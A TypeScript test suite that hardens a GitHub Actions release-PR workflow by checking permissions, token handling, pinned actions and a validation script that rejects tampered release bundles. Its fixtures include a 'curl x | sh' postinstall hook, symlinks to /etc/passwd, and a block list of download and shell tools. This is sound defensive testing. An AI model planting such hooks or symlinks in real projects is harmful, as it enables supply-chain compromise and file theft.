import { describe, expect, it } from "bun:test";
import { spawnSync } from "node:child_process";
import {
    chmodSync,
    mkdirSync,
    mkdtempSync,
    readFileSync,
    rmSync,
    symlinkSync,
    writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { CHANNELS } from "./release-channels";
import { ALLOWED_PATHS, channelNames, VERSION_LINES } from "./release-pr";

const root = path.resolve(import.meta.dirname, "..");
const file = readFileSync(path.join(root, ".github/workflows/release-pr.yaml"), "utf8");
// Comments may name what is forbidden.
const code = file.replace(/^\s*#.*$/gm, "");

interface Step {
    name?: string;
    id?: string;
    uses?: string;
    run?: string;
    if?: string;
    with?: Record<string, unknown>;
    env?: Record<string, string>;
    "continue-on-error"?: unknown;
}
interface Job {
    needs?: string[];
    environment?: string;
    permissions?: Record<string, string>;
    env?: Record<string, string>;
    outputs?: Record<string, string>;
    steps: Step[];
    if?: string;
}
const wf = Bun.YAML.parse(file) as {
    on: Record<string, { inputs?: Record<string, Record<string, unknown>> } | null>;
    permissions: Record<string, string>;
    concurrency: { group: string; "cancel-in-progress": boolean };
    defaults: { run: { shell: string } };
    env: Record<string, string>;
    jobs: Record<string, Job>;
};
const { prepare, push, "open-pr": openPr } = wf.jobs as Record<string, Job>;
const all = Object.entries(wf.jobs).flatMap(([id, job]) => job.steps.map((step) => ({ id, step })));
const stepOf = (job: Job, text: string) => job.steps.find((s) => (s.name ?? "").includes(text))!;
const indexOf = (job: Job, text: string) =>
    job.steps.findIndex((s) => (s.name ?? "").includes(text));
const runsOf = (job: Job) => job.steps.map((s) => s.run ?? "").join("\n");
const commandsOf = (job: Job) =>
    runsOf(job)
        .split("\n")
        .map((line) => line.trim())
        .filter(Boolean);

describe("release PR workflow trigger and inputs", () => {
    it("starts only by hand", () => {
        expect(Object.keys(wf.on)).toEqual(["workflow_dispatch"]);
        expect(code).not.toMatch(/repository_dispatch|schedule:|pull_request:|workflow_call/);
    });

    it("takes a base version and a channel chosen from a static list equal to the registry", () => {
        const inputs = wf.on.workflow_dispatch!.inputs!;
        expect(Object.keys(inputs)).toEqual(["base", "channel"]);
        expect(inputs.base).toMatchObject({ type: "string", required: true });
        expect(inputs.channel).toMatchObject({ type: "choice", required: true, default: "stable" });
        expect((inputs.channel!.options as string[]).toSorted()).toEqual(channelNames().toSorted());
    });

    it("runs one dispatch per base version at a time and never cancels one", () => {
        expect(wf.concurrency).toEqual({
            group: "release-pr-${{ inputs.base }}",
            "cancel-in-progress": false,
        });
    });

    it("runs from main only, before anything is checked out", () => {
        expect(Object.keys(wf.jobs)).toEqual(["prepare", "push", "open-pr"]);
        const guard = prepare.steps[0]!;
        expect(guard.name).toContain("Run from main only");
        expect(guard.run).toContain('[ "$REF" != "refs/heads/main" ]');
        expect(guard.run).toContain("exit 1");
        expect(prepare.env?.REF).toBe("${{ github.ref }}");
        expect(prepare.steps.findIndex((s) => s.uses?.startsWith("actions/checkout@"))).toBe(1);
        // The later jobs need `prepare`, so they never run when it fails.
        expect(push.needs).toEqual(["prepare"]);
        expect(openPr.needs?.toSorted()).toEqual(["prepare", "push"]);
    });
});

describe("release PR workflow privilege split", () => {
    it("holds nothing at workflow level and one scope set per job", () => {
        expect(wf.permissions).toEqual({});
        expect(prepare.permissions).toEqual({ contents: "read" });
        expect(push.permissions).toEqual({ contents: "write" });
        expect(openPr.permissions).toEqual({ "pull-requests": "write", actions: "write" });
        expect(prepare.environment).toBeUndefined();
        expect(push.environment).toBe("release-pr");
        expect(openPr.environment).toBe("release-pr");
    });

    it("gives the code that runs dependencies no token and no write scope", () => {
        expect(JSON.stringify(prepare.permissions)).not.toContain("write");
        for (const { step } of all.filter((a) => a.id === "prepare")) {
            expect(step.env?.GH_TOKEN).toBeUndefined();
            expect(step.run ?? "").not.toMatch(/GH_TOKEN|github\.token|extraheader|\bgh \b/);
        }
        expect(runsOf(prepare)).toContain("bun install --frozen-lockfile");
        expect(runsOf(prepare)).toContain("cog bump");
    });

    it("installs nothing and runs no repository code in the jobs that write", () => {
        for (const job of [push, openPr]) {
            const text = runsOf(job).replace(/^\s*allow=.*$/m, "");
            expect(text).not.toMatch(
                /\b(bun|bunx|npm|npx|node|yarn|pnpm|omni|cog|python|perl|ruby|make|curl|wget)\b|tooling\/|sh -c/,
            );
            for (const step of job.steps) {
                if (step.uses) {
                    expect(step.uses.split("@")[0]).toMatch(
                        /^actions\/(checkout|download-artifact)$/,
                    );
                }
            }
        }
        // `open-pr` does not even check out the repository.
        expect(openPr.steps.some((s) => s.uses?.startsWith("actions/checkout@"))).toBe(false);
        expect(push.steps.filter((s) => s.uses?.startsWith("actions/checkout@"))).toHaveLength(1);
    });

    it("runs only these git subcommands in the push job, and nothing from the artifact as code", () => {
        const used = new Set<string>();
        for (const m of runsOf(push).matchAll(/\bgit (?:-c "[^"]*" )?([a-z-]+)(?: ([a-z-]+))?/g)) {
            used.add(m[1] === "bundle" ? `bundle ${m[2]}` : m[1]!);
        }
        expect([...used].toSorted()).toEqual(
            [
                "bundle list-heads",
                "bundle verify",
                "diff",
                "fetch",
                "log",
                "ls-remote",
                "push",
                "rev-list",
                "rev-parse",
                "show",
                "switch",
            ].toSorted(),
        );
        // Nothing the artifact holds is run: it is only ever read by `git` and tested by `[[`.
        expect(runsOf(push)).not.toMatch(/\beval\b|\bsource\b|\. "\$|`/);
    });

    it("pushes only the release branch, by an explicit refspec, and never a tag", () => {
        const pushes = commandsOf(push).filter((c) => /\bpush\b/.test(c));
        expect(pushes).toEqual([
            'git -c "http.https://github.com/.extraheader=AUTHORIZATION: basic $auth" push origin "HEAD:refs/heads/release/$VERSION"',
        ]);
        expect(code).not.toMatch(
            /--tags|--force|--mirror|\+HEAD|--all|--delete|refs\/tags|git tag/,
        );
        expect(code).not.toMatch(/push[^\n]*(--|\+)/);
    });

    it("gives the token to one step of push and two of open-pr, none elsewhere", () => {
        const holders = all.filter(({ step }) => step.env?.GH_TOKEN !== undefined);
        expect(holders.map(({ id, step }) => `${id}: ${step.name}`)).toEqual([
            "push: Push the release branch only",
            "open-pr: Open the pull request",
            "open-pr: Start CI on the branch",
        ]);
        for (const job of Object.values(wf.jobs)) {
            expect(job.env?.GH_TOKEN).toBeUndefined();
        }
        expect(wf.env.GH_TOKEN).toBeUndefined();
        for (const { step } of all.filter((a) => a.id === "push" && a.step.uses)) {
            expect(step.env?.GH_TOKEN).toBeUndefined();
        }
        for (const { id, step } of all.filter((a) =>
            a.step.uses?.startsWith("actions/checkout@"),
        )) {
            expect(step.with, id).toMatchObject({
                "persist-credentials": false,
                ref: "${{ github.sha }}",
            });
        }
    });

    it("opens the PR from the validated version and the body as a file", () => {
        expect(openPr.env?.VERSION).toBe("${{ needs.push.outputs.version }}");
        expect(push.outputs?.version).toBe("${{ steps.validate.outputs.version }}");
        const commands = commandsOf(openPr).join("\n");
        expect(commands).toContain(
            '--title "chore(release): v$VERSION" --body-file "$RUNNER_TEMP/data/body.md"',
        );
        expect(stepOf(openPr, "Start CI").run).toBe(
            'gh workflow run ci.yaml --repo "$GITHUB_REPOSITORY" --ref "release/$VERSION"',
        );
        expect(indexOf(openPr, "Open the pull request")).toBeLessThan(indexOf(openPr, "Start CI"));
        for (const command of commandsOf(openPr).filter((c) => c.startsWith("gh "))) {
            expect(command).toMatch(
                /^gh (pr create --repo "\$GITHUB_REPOSITORY" --base main|workflow run ci\.yaml --repo)/,
            );
        }
    });

    it("checks the commit message and the title before anything is pushed", () => {
        const text = runsOf(prepare);
        expect(text).toContain('cog verify "chore(release): v$VERSION"');
        expect(text).toContain('cog verify "$(git log -1 --format=%B)"');
        expect(text).toContain(
            'git bundle create "$RUNNER_TEMP/data/release.bundle" "release/$VERSION" "^$GITHUB_SHA"',
        );
        expect(commandsOf(prepare)).toContain('cog bump --version "$VERSION" --include-packages');
        expect(indexOf(prepare, "Check the messages")).toBeLessThan(
            indexOf(prepare, "Bundle the bump commit"),
        );
    });
});

describe("release PR workflow credentials and supply chain", () => {
    it("uses no secret and no token for a registry", () => {
        expect(code).not.toMatch(
            /secrets\.|id-token|packages:|NODE_AUTH_TOKEN|NPM_TOKEN|_authToken/,
        );
        for (const m of code.match(/\$\{\{[^}]*\btoken\b[^}]*\}\}/g) ?? [])
            expect(m).toMatch(/github\.token/);
    });

    it("passes untrusted inputs through env only", () => {
        for (const { id, step } of all)
            expect(step.run ?? "", `${id}: ${step.name}`).not.toContain("${{");
        expect(prepare.env).toMatchObject({
            BASE: "${{ inputs.base }}",
            CHANNEL: "${{ inputs.channel }}",
        });
        expect(push.env).toMatchObject({
            BASE: "${{ inputs.base }}",
            CHANNEL: "${{ inputs.channel }}",
            VERSION: "${{ needs.prepare.outputs.version }}",
        });
        expect(stepOf(prepare, "Plan the release").run).toContain(
            '--base "$BASE" --channel "$CHANNEL"',
        );
    });

    it("pins every action by full commit SHA with the version in a comment", () => {
        const uses = file.split("\n").filter((line) => /^\s*(- )?uses:/.test(line));
        expect(uses.length).toBeGreaterThan(4);
        for (const line of uses) {
            expect(line, line).toMatch(/uses: [\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+(\.\d+)*$/);
        }
    });

    it("restores no cache", () => {
        expect(code).not.toMatch(
            /actions\/cache|setup-omni|setup-workspace|cache-from|cache-to|restore-keys/,
        );
        for (const { step } of all) {
            if (step.uses?.startsWith("actions/setup-node"))
                expect(step.with?.["package-manager-cache"]).toBe(false);
            if (step.uses?.startsWith("oven-sh/setup-bun"))
                expect(step.with?.["no-cache"]).toBe(true);
        }
    });

    it("installs Omni and Cocogitto from pinned releases whose checksums are verified", () => {
        expect(wf.env.OMNI_SHA256).toMatch(/^[0-9a-f]{64}$/);
        expect(wf.env.COG_SHA256).toMatch(/^[0-9a-f]{64}$/);
        expect(stepOf(prepare, "Install Omni").run).toContain("sha256sum -c -");
        expect(stepOf(prepare, "Install Cocogitto").run).toContain("sha256sum -c -");
        const release = (
            Bun.YAML.parse(
                readFileSync(path.join(root, ".github/workflows/release.yaml"), "utf8"),
            ) as { env: Record<string, string> }
        ).env;
        expect(wf.env.OMNI_VERSION).toBe(release.OMNI_VERSION);
        expect(wf.env.OMNI_SHA256).toBe(release.OMNI_SHA256);
        expect(stepOf(prepare, "Install dependencies").run).toBe("bun install --frozen-lockfile");
    });

    it("runs in bash, with no conditional steps and no failures swallowed", () => {
        expect(wf.defaults.run.shell).toBe("bash");
        for (const job of Object.values(wf.jobs)) expect(job.if).toBeUndefined();
        for (const { step } of all) {
            expect(step.if, step.name).toBeUndefined();
            expect(step["continue-on-error"], step.name).toBeUndefined();
        }
        expect(code).not.toMatch(/\|\| true|set \+e|continue-on-error/);
    });

    it("keeps the handed-over artifact short-lived", () => {
        const upload = prepare.steps.find((s) => s.uses?.startsWith("actions/upload-artifact@"))!;
        expect(upload.with).toMatchObject({ name: "release-pr-data", "retention-days": 7 });
    });
});

// The push job cannot run repository code, so it repeats the pattern lists and the channel names
// in shell. They are compared with the repository's.
describe("the push job's validation agrees with tooling/release-pr.ts and the registry", () => {
    const script = stepOf(push, "Validate the release data").run!;

    it("has the same path allowlist", () => {
        const allow = /allow='([^']+)'/.exec(script)![1]!;
        expect(allow).toBe(ALLOWED_PATHS.map((p) => p.source.replaceAll("\\/", "/")).join("|"));
    });

    it("has the same version-line shapes, file by file", () => {
        const arms = [...script.matchAll(/^\s+([^\s)]+(?: \| [^\s)]+)?)\) re='([^']+)' ;;$/gm)];
        expect(arms).toHaveLength(VERSION_LINES.length);
        const posix = (re: string) => re.replace(/\[\[:space:\]\]/g, "\\s");
        for (const [, , re] of arms) {
            expect(VERSION_LINES.map((rule) => rule.line.source)).toContain(posix(re!));
        }
    });

    it("names exactly the registry's pre-release channels", () => {
        const names = [...script.matchAll(/^\s+([a-z]+)\) ;;$/gm)].map((m) => m[1]);
        expect(names).toEqual(
            CHANNELS.filter((c) => c.preRelease !== null).map((c) =>
                c.preRelease!.replace(/^-/, "").replace(/\.N$/, ""),
            ),
        );
    });
});

// Run the real validation step against repositories built for the purpose.
describe("the push job's validation, run for real", () => {
    const script = stepOf(push, "Validate the release data").run!;
    const git = (cwd: string, ...args: string[]) => {
        const done = spawnSync("git", args, {
            cwd,
            encoding: "utf8",
            env: {
                PATH: process.env.PATH!,
                GIT_AUTHOR_NAME: "t",
                GIT_AUTHOR_EMAIL: "t@e.x",
                GIT_COMMITTER_NAME: "t",
                GIT_COMMITTER_EMAIL: "t@e.x",
                HOME: tmpdir(),
                GIT_CONFIG_GLOBAL: "/dev/null",
            },
        });
        if (done.status !== 0) throw new Error(`git ${args.join(" ")}: ${done.stderr}`);
        return done.stdout.trim();
    };
    const write = (dir: string, name: string, text: string) => {
        mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
        writeFileSync(path.join(dir, name), text);
    };
    const pkg = (version: string, extra = "") =>
        `{\n    "name": "x",\n    "version": "${version}",${extra}\n    "private": true\n}\n`;
    const program = (version: string) =>
        `export const a = 1;\n    const p = new Command()\n        .version("${version}")\n        .name("x");\n`;

    interface Setup {
        version?: string;
        base?: string;
        channel?: string;
        message?: string;
        change?: (repo: string) => void;
        extraCommit?: boolean;
        emptyCommit?: boolean;
        bundleRefs?: string[];
        noBundle?: boolean;
        symlinkBundle?: boolean;
        mergeCommit?: boolean;
    }

    function outcome(setup: Setup = {}) {
        const version = setup.version ?? "0.1.0-rc.1";
        const dir = mkdtempSync(path.join(tmpdir(), "validate-"));
        const origin = path.join(dir, "origin");
        mkdirSync(origin);
        git(origin, "init", "-q", "-b", "main");
        write(origin, "first.txt", "first\n");
        git(origin, "add", "-A");
        git(origin, "commit", "-qm", "first");
        write(origin, "package.json", pkg("0.0.0"));
        write(origin, "apps/cli/package.json", pkg("0.0.0"));
        write(origin, "apps/cli/src/program.ts", program("0.0.0"));
        write(origin, "CHANGELOG.md", "# Changelog\n");
        write(origin, "bun.lock", "{}\n");
        write(origin, ".github/workflows/x.yaml", "name: x\n");
        write(origin, "tooling/script.ts", "export {};\n");
        git(origin, "add", "-A");
        git(origin, "commit", "-qm", "base");
        const base = git(origin, "rev-parse", "HEAD");
        const work = path.join(dir, "work");
        git(dir, "clone", "-q", origin, work);
        const bump = path.join(dir, "bump");
        git(dir, "clone", "-q", origin, bump);
        git(bump, "switch", "-q", "-c", `release/${version}`);
        if (setup.extraCommit) {
            write(bump, "CHANGELOG.md", "# Changelog\nextra\n");
            git(bump, "commit", "-qam", "extra");
        }
        if (setup.emptyCommit) {
            git(
                bump,
                "commit",
                "-q",
                "--allow-empty",
                "-m",
                setup.message ?? `chore(version): v${version}`,
            );
        } else {
            if (setup.change) setup.change(bump);
            else {
                write(bump, "package.json", pkg(version));
                write(bump, "apps/cli/package.json", pkg(version));
                write(bump, "apps/cli/src/program.ts", program(version));
                write(bump, "CHANGELOG.md", "# Changelog\n## v\n- change\n");
                write(bump, "packages/tsconfig/CHANGELOG.md", "new\n");
            }
            git(bump, "add", "-A");
            git(bump, "commit", "-qm", setup.message ?? `chore(version): v${version}`);
        }
        if (setup.mergeCommit) {
            // A merge of main and its parent: one new commit, but not directly on main.
            const tree = git(bump, "rev-parse", "HEAD^{tree}");
            const merge = git(
                bump,
                "commit-tree",
                tree,
                "-p",
                base,
                "-p",
                `${base}~1`,
                "-m",
                `chore(version): v${version}`,
            );
            git(bump, "reset", "-q", "--hard", merge);
        }
        const data = path.join(dir, "tmp", "data");
        mkdirSync(data, { recursive: true });
        if (!setup.noBundle) {
            const refs = setup.bundleRefs ?? [`release/${version}`];
            for (const ref of refs) if (ref !== `release/${version}`) git(bump, "branch", ref);
            git(bump, "bundle", "create", path.join(data, "release.bundle"), ...refs, `^${base}`);
            if (setup.symlinkBundle) {
                rmSync(path.join(data, "release.bundle"));
                symlinkSync("/etc/hostname", path.join(data, "release.bundle"));
            }
        }
        const out = path.join(dir, "output");
        writeFileSync(out, "");
        const done = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script], {
            cwd: work,
            encoding: "utf8",
            env: {
                PATH: process.env.PATH!,
                HOME: tmpdir(),
                GIT_CONFIG_GLOBAL: "/dev/null",
                RUNNER_TEMP: path.join(dir, "tmp"),
                GITHUB_SHA: base,
                GITHUB_OUTPUT: out,
                BASE: setup.base ?? "0.1.0",
                CHANNEL: setup.channel ?? "rc",
                VERSION: setup.version ?? version,
            },
        });
        const output = readFileSync(out, "utf8").toString();
        rmSync(dir, { recursive: true, force: true });
        return { code: done.status, stderr: `${done.stdout}${done.stderr}`, output };
    }

    it("accepts a bump commit that touches only versions and changelogs", () => {
        const done = outcome();
        if (done.code !== 0) console.log(done.stderr);
        expect(done.code).toBe(0);
        expect(done.output).toMatch(/^version=0\.1\.0-rc\.1\ncommit=[0-9a-f]{40}\n$/);
    });

    it("accepts a stable release and a counter above 9", () => {
        expect(outcome({ version: "0.1.0", channel: "stable" }).code).toBe(0);
        expect(outcome({ version: "0.1.0-rc.12" }).code).toBe(0);
    });

    const refused: [string, Setup, string][] = [
        [
            "a changed workflow",
            { change: (r) => write(r, ".github/workflows/x.yaml", "name: evil\n") },
            "not an allowed path",
        ],
        [
            "a changed script",
            { change: (r) => write(r, "tooling/script.ts", "evil();\n") },
            "not an allowed path",
        ],
        [
            "a new workflow",
            { change: (r) => write(r, ".github/workflows/new.yaml", "name: y\n") },
            "not an allowed path",
        ],
        [
            "a manifest line other than the version",
            {
                change: (r) =>
                    write(
                        r,
                        "package.json",
                        pkg("0.1.0-rc.1", '\n    "postinstall": "curl x | sh",'),
                    ),
            },
            "only the version line may change",
        ],
        [
            "an extra source line",
            {
                change: (r) =>
                    write(
                        r,
                        "apps/cli/src/program.ts",
                        program("0.1.0-rc.1").replace('.name("x")', '.name("x").evil()'),
                    ),
            },
            "only the version line may change",
        ],
        [
            "a source version line with extra code",
            {
                change: (r) =>
                    write(
                        r,
                        "apps/cli/src/program.ts",
                        program("0.1.0-rc.1").replace(
                            '.version("0.1.0-rc.1")',
                            '.version("0.1.0-rc.1"); exec()',
                        ),
                    ),
            },
            "only the version line may change",
        ],
        [
            "a deleted changelog",
            { change: (r) => rmSync(path.join(r, "CHANGELOG.md")) },
            "not an addition or a modification",
        ],
        [
            "a made-executable manifest",
            {
                change: (r) => {
                    write(r, "package.json", pkg("0.1.0-rc.1"));
                    chmodSync(path.join(r, "package.json"), 0o755);
                },
            },
            "not an addition or a modification",
        ],
        [
            "a symlink in place of the lockfile",
            {
                change: (r) => {
                    rmSync(path.join(r, "bun.lock"));
                    symlinkSync("/etc/passwd", path.join(r, "bun.lock"));
                },
            },
            "not an addition or a modification",
        ],
        [
            "a manifest of a package with another line changed",
            {
                change: (r) =>
                    write(
                        r,
                        "apps/cli/package.json",
                        pkg("0.1.0-rc.1", '\n    "postinstall": "curl x | sh",'),
                    ),
            },
            "only the version line may change",
        ],
        ["a merge commit instead of one commit on main", { mergeCommit: true }, "directly on main"],
        ["an empty commit", { emptyCommit: true }, "changes nothing"],
        ["two commits", { extraCommit: true }, "exactly one new commit"],
        [
            "another commit message",
            { message: "chore(version): v9.9.9" },
            "unexpected commit message",
        ],
        [
            "a message with a body",
            { message: "chore(version): v0.1.0-rc.1\n\nextra" },
            "unexpected commit message",
        ],
        [
            "two refs in the bundle",
            { bundleRefs: ["release/0.1.0-rc.1", "release/other"] },
            "must hold one ref",
        ],
        ["another ref name", { bundleRefs: ["release/9.9.9"] }, "holds another ref"],
        ["no bundle", { noBundle: true }, "no bundle"],
        ["a symlinked bundle", { symlinkBundle: true }, ""],
        [
            "a version that does not start with the base",
            { base: "0.2.0" },
            "does not start with the base",
        ],
        ["a base that is not X.Y.Z", { base: "0.1" }, "the base is not X.Y.Z"],
        ["a channel other than the version's", { channel: "stable" }, "not of the chosen channel"],
        [
            "a stable version for the rc channel",
            { version: "0.1.0", channel: "rc" },
            "not of the chosen channel",
        ],
        [
            "an unregistered channel",
            { version: "0.1.0-foo.1", channel: "foo" },
            "not a registered pre-release channel",
        ],
        ["a counter with a leading zero", { version: "0.1.0-rc.01" }, "must be <channel>.<N>"],
        ["a bare channel", { version: "0.1.0-rc" }, "must be <channel>.<N>"],
        [
            "a version longer than 128 characters",
            { version: `0.1.0-rc.${"1".repeat(130)}` },
            "longer than 128",
        ],
    ];

    it.each(refused)("refuses %s", (_what, setup, message) => {
        const done = outcome(setup);
        expect(done.code).not.toBe(0);
        expect(done.stderr).toContain(message);
        expect(done.output).toBe("");
    });
});
